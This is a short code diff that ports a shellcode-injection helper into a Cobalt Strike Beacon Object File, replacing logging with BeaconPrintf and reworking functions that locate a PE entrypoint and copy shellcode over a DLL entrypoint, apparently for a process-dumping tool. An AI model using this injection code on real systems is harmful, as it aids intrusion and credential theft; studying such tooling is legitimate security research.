@@ -2,36 +2,32 @@
 // https://twitter.com/GabrielLandau
 
 #define _CRT_SECURE_NO_WARNINGS
+#include <stdint.h>
 #include "PayloadUtils.h"
 #include "bofdefs.h"
 #include <DbgHelp.h>
-#include <string>
-#include "Logging.h"
 
-uint8_t* shellcode;
-DWORD shellcodelen;
-
-extern bool InitShellcodeParams(
+extern BOOL InitShellcodeParams(
     PVOID pParams,
     DWORD dwTargetProcessId,
     PCWCHAR pDumpPath
 );
 
 // Finds the address within buf of the image entrypoint 
-PVOID FindEntrypointVA(const std::string& buf)
+PVOID FindEntrypointVA( void * buf)
 {
-    PVOID pBase = (PVOID)buf.data();
+    PVOID pBase = buf;
     PIMAGE_NT_HEADERS pNtHeaders = DBGHELP$ImageNtHeader(pBase);
 
     if (NULL == pNtHeaders)
     {
-        Log(Error, "FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?", KERNEL32$GetLastError());
         return NULL;
     }
 
     if (IMAGE_FILE_MACHINE_AMD64 != pNtHeaders->FileHeader.Machine)
     {
-        Log(Error, "FindOffsetOfEntrypoint: Only x64 is supported");
+        BeaconPrintf(CALLBACK_ERROR, "FindOffsetOfEntrypoint: Only x64 is supported");
         return NULL;
     }
 
@@ -40,7 +36,7 @@ PVOID FindEntrypointVA(const std::string& buf)
 }
 
 // Pulls the shellcode out of our resource section and writes to the given pointer
-bool WriteShellcode(PVOID pBuf, DWORD& bytesWritten)
+BOOL WriteShellcode(PVOID pBuf, PVOID shellcode, DWORD shellcodelen, DWORD* bytesWritten)
 {
     HRSRC hr = NULL;
     HGLOBAL hg = NULL;
@@ -50,10 +46,10 @@ bool WriteShellcode(PVOID pBuf, DWORD& bytesWritten)
     
 
     memcpy(pBuf, shellcode, shellcodelen);
-    bytesWritten = shellcodelen;
+    *bytesWritten = shellcodelen;
 
     internal_printf("GetShellcode: %u bytes of shellcode written over DLL entrypoint", rSize);
 
 
-    return true;
+    return TRUE;
 }
